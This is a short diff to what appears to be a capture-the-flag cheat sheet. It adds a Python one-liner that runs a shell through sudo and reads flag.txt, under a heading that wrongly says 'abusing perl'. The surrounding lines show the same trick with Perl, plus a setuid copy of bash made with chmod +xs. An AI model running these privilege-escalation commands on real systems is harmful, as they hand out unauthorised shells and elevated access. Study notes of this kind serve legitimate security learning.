@@ -58,6 +58,12 @@ Poratble Database
 #### sudo -u user perl -e 'exec "/bin/sh";'
 #### sudo -u user perl -e 'print `cat flag.txt`'
 
+### Privilege Escalation abusing perl
+#### sudo -u user python -c 'import os; os.system("/bin/sh")'
+#### sudo -u python
+###### import os
+###### os.system('cat flag.txt')
+
 ### Privilege Escalation with cp and chmod
 #### Copy the /bin/bash to /tmp/test
 #### chmod +xs /tmp/test && ./test
